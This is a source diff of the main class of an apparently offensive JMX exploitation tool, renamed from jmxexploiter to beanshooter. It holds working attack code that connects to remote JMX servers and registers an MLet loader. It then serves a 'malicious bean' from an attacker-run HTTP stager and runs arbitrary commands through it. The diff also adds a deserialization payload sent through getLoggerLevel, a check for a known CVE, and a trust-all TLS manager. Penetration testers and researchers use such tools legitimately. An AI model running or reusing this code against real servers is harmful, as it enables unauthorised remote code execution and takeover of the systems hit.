@@ -1,20 +1,30 @@
-package de.qtc.jmxexploiter;
+package de.qtc.beanshooter;
 
-import de.qtc.jmxexploiter.JarHandler;
-import de.qtc.jmxexploiter.MLetHandler;
+import java.io.IOException;
+import java.io.File;
 import java.net.InetSocketAddress;
+import java.rmi.server.RMISocketFactory;
 import java.util.HashMap;
 
+import javax.management.InstanceNotFoundException;
+import javax.management.MBeanException;
 import javax.management.MBeanServerConnection;
 import javax.management.MalformedObjectNameException;
 import javax.management.ObjectName;
+import javax.management.ReflectionException;
+import javax.management.RuntimeMBeanException;
 import javax.management.remote.JMXConnector;
 import javax.management.remote.JMXConnectorFactory;
 import javax.management.remote.JMXServiceURL;
+import javax.net.ssl.SSLContext;
+import javax.net.ssl.TrustManager;
+import javax.rmi.ssl.SslRMIClientSocketFactory;
+
 import com.sun.net.httpserver.HttpServer;
 
+
 public class GreenGrocer {
- 
+
     String jarPath = null;
     String jarName = null;
     String beanClass = null;
@@ -35,33 +45,68 @@ public class GreenGrocer {
         this.beanName = new ObjectName(this.objectName);
     }
 
-    public void connect(String host, int port, String username, String password, String boundName, boolean jmxmp) 
+    @SuppressWarnings({ "rawtypes", "unchecked" })
+    public void connect(String host, int port, String boundName, Object credentials, boolean jmxmp, boolean ssl, boolean followRedirect, String saslMechanism)
     {
         try {
-            /* Setup of the credentials and the service URL */
-            HashMap<String, String[]> environment = new HashMap<String, String[]>();
-            String[] credentials = new String[] {username, password};
-            environment.put(JMXConnector.CREDENTIALS, credentials);
+            HashMap environment = new HashMap();
+
+            if( credentials != null )
+                environment.put(JMXConnector.CREDENTIALS, credentials);
 
             JMXServiceURL jmxUrl = new JMXServiceURL("service:jmx:rmi:///jndi/rmi://" + host + ":" + port +  "/" + boundName);
             if( jmxmp ) {
                 jmxUrl = new JMXServiceURL("service:jmx:jmxmp://" + host + ":" + port);
+                if(saslMechanism != null) {
+                    environment.put("jmx.remote.profiles", saslMechanism);
+                    if( saslMechanism.contains("DIGEST") || saslMechanism.contains("NTLM") ) {
+                        environment.put("jmx.remote.sasl.callback.handler", new RealmHandler());
+                    }
+                }
             }
 
-            /* Connection Attempt */
+            RMISocketFactory fac = RMISocketFactory.getDefaultSocketFactory();
+            RMISocketFactory my = new LoopbackSocketFactory(host, fac, followRedirect);
+            RMISocketFactory.setSocketFactory(my);
+
+            SSLContext ctx = SSLContext.getInstance("TLS");
+            ctx.init(null, new TrustManager[] { new DummyTrustManager() }, null);
+            SSLContext.setDefault(ctx);
+
+            LoopbackSslSocketFactory.host = host;
+            LoopbackSslSocketFactory.fac = ctx.getSocketFactory();
+            LoopbackSslSocketFactory.followRedirect = followRedirect;
+            java.security.Security.setProperty("ssl.SocketFactory.provider", "de.qtc.beanshooter.LoopbackSslSocketFactory");
+
+            if( ssl ) {
+                environment.put("com.sun.jndi.rmi.factory.socket", new SslRMIClientSocketFactory());
+                if( jmxmp ) {
+                    environment.put("jmx.remote.tls.socket.factory", ctx.getSocketFactory());
+                    if(saslMechanism == null) {
+                        environment.put("jmx.remote.profiles", "TLS");
+                    }
+                }
+            }
+
             System.out.print("[+] Connecting to JMX server... ");
             jmxConnector = JMXConnectorFactory.connect(jmxUrl, environment);
             System.out.println("done!");
 
-            /* Generate MBeanServerConnection */
             System.out.print("[+] Creating MBeanServerConnection... ");
             this.mBeanServer = jmxConnector.getMBeanServerConnection();
             System.out.println("done!\n[+]");
 
-        /* If any of the above one failes, we can terminate the program */
         } catch( Exception e ) {
-            System.out.println("failed!");
-            System.out.println("[-] The following exception was thrown: " + e.toString() + "\n");
+
+            System.err.println("failed!\n[*]");
+
+            if( e instanceof SecurityException && e.getMessage().contains("Credentials should be String[]") ) {
+                System.out.println("[*] Caught SecurityException with content '" + e.getMessage() + "'.");
+                System.out.println("[*]     Target is most likely vulnerable to cve-2016-3427.");
+                System.exit(0);
+            }
+
+            System.err.println("[-] The following exception was thrown: " + e.toString());
             System.exit(1);
         }
     }
@@ -77,7 +122,7 @@ public class GreenGrocer {
         }
     }
 
-    public void registerMLet() 
+    public void registerMLet()
     {
         try {
             /* First we try to register the MLet for JMX MBean deployment */
@@ -99,7 +144,7 @@ public class GreenGrocer {
         }
     }
 
-    public void unregisterMLet() 
+    public void unregisterMLet()
     {
         try {
             /* Trying to unregister the MLet from the JMX endpoint */
@@ -121,7 +166,7 @@ public class GreenGrocer {
         }
     }
 
-    public void jmxStatus() 
+    public void jmxStatus()
     {
         try {
             /* First we check if the MLet is registered on the JMX endpoint */
@@ -153,7 +198,7 @@ public class GreenGrocer {
          }
     }
 
-    public void registerBean(String stagerHost, String stagerPort, boolean remoteStager) 
+    public void registerBean(String stagerHost, String stagerPort, boolean remoteStager)
     {
         try {
             /* If the malicious Bean is already registered, we are done */
@@ -211,11 +256,11 @@ public class GreenGrocer {
              this.disconnect();
              System.exit(1);
         }
-    }    
+    }
 
-    public void unregisterBean() 
+    public void unregisterBean()
     {
-        /* Just try to unregister the bean, even if it is not registered */ 
+        /* Just try to unregister the bean, even if it is not registered */
         try {
             System.out.print("[+] Unregister malicious bean... ");
             this.mBeanServer.unregisterMBean(this.beanName);
@@ -234,7 +279,7 @@ public class GreenGrocer {
         }
     }
 
-    public void ping() 
+    public void ping()
     {
         try {
             System.out.print("[+] Sending ping to the server... ");
@@ -250,13 +295,13 @@ public class GreenGrocer {
         }
     }
 
-    public String executeCommand(String command, boolean verbose) 
+    public String executeCommand(String command, boolean verbose)
     {
         try {
-            System.out.print("[+] Sending command '" + command + "' to the server... ");
+            if(verbose)
+                System.out.println("[+] Sending command '" + command + "' to the server... ");
             Object response = this.mBeanServer.invoke(this.beanName, "executeCommand", new Object[]{ command }, new String[]{ String.class.getName() });
-            System.out.println("done!");
-            
+
             if(verbose)
                 System.out.print("[+] Servers answer is: " + response);
             return (String)response;
@@ -267,15 +312,15 @@ public class GreenGrocer {
             this.disconnect();
             System.exit(1);
         }
-		return "Unexpected Error";
+        return "Unexpected Error";
     }
 
     public String executeCommandBackground(String command, boolean verbose)
     {
         try {
-            System.out.print("[+] Sending command '" + command + "' to the server... ");
+            if(verbose)
+                System.out.println("[+] Sending command '" + command + "' to the server... ");
             Object response = this.mBeanServer.invoke(this.beanName, "executeCommandBackground", new Object[]{ command }, new String[]{ String.class.getName() });
-            System.out.println("done!");
 
             if(verbose)
                 System.out.print("[+] Servers answer is: " + response);
@@ -287,40 +332,81 @@ public class GreenGrocer {
             this.disconnect();
             System.exit(1);
         }
-		return "Unexpected Error";
+        return "Unexpected Error";
     }
 
-    public HttpServer startStagerServer(String stagerHost, String stagerPort) 
+    public void getLoggerLevel(Object payload)
+    {
+        System.out.println("[+] Sending payload to 'getLoggerLevel'...");
+        try {
+            ObjectName loggingMBean = new ObjectName("java.util.logging:type=Logging");
+            this.mBeanServer.invoke(loggingMBean, "getLoggerLevel", new Object[]{ payload }, new String[]{String.class.getCanonicalName()});
+
+        } catch (NullPointerException | MalformedObjectNameException | InstanceNotFoundException | MBeanException | ReflectionException | IOException e) {
+            if( e.getCause() instanceof ClassNotFoundException) {
+                System.err.println("[-]     ClassNotFoundException. Chosen gadget is probably not available on the target.");
+            } else {
+                System.err.println("[-]     Encountered unexcepted exception.");
+            }
+
+            System.err.println("[-]     StackTrace:");
+            e.printStackTrace();
+
+        } catch (RuntimeMBeanException e) {
+            if( e.getCause() instanceof IllegalArgumentException) {
+                System.out.println("[+]     IllegalArgumentException. This is fine :) Payload probably worked.");
+            } else if (e.getCause() instanceof SecurityException) {
+                System.out.println("[+]     SecurityException. This is fine :) Payload probably worked.");
+            } else {
+                System.err.println("[-]     Encountered unexcepted exception. Payload seems not to work :(");
+                System.err.println("[-]     StackTrace:");
+                e.printStackTrace();
+            }
+
+        } catch (SecurityException e) {
+            System.out.println("[+]     SecurityException. This is fine :) Payload probably worked.");
+        }
+    }
+
+    public HttpServer startStagerServer(String stagerHost, String stagerPort)
     {
         HttpServer server = null;
         try {
+
+            File maliciousBean = new File(this.jarPath + this.jarName);
+            if( !maliciousBean.exists() || maliciousBean.isDirectory() ) {
+                System.err.println("[+] Unable to find MBean '" + maliciousBean.getCanonicalPath() + "' for deployment.");
+                System.err.println("[+] Stopping execution.");
+                System.exit(1);
+            }
+
             /* First we create a new HttpServer object */
             server = HttpServer.create(new InetSocketAddress(stagerHost, Integer.valueOf(stagerPort)), 0);
             System.out.println("[+] \tCreating HTTP server on " + stagerHost + ":" + stagerPort);
-    
+
             /* Then we register an MLetHandler for requests on the endpoint /mlet */
             System.out.print("[+] \t\tCreating MLetHandler for endpoint /mlet... ");
             server.createContext("/mlet", new MLetHandler(stagerHost, stagerPort, this.beanClass, this.jarName, this.objectName));
             System.out.println("done!");
-    
+
             /* Then we register a jar handler for requests that target our jarName */
             System.out.print("[+] \t\tCreating JarHandler for endpoint /" + this.jarName + "... ");
             server.createContext("/" + this.jarName, new JarHandler(this.jarName, this.jarPath));
             System.out.println("done!");
-    
-            server.setExecutor(null); 
-    
+
+            server.setExecutor(null);
+
             System.out.print("[+]\t\tStarting the HTTP server... ");
             server.start();
             System.out.println("done!\n[+]");
-    
+
         } catch (Exception e) {
             System.out.println("failed!");
             System.out.println("[-] The following exception was thrown: " + e.toString() + "\n");
             this.disconnect();
             System.exit(1);
         }
-    
+
         return server;
     }
 }
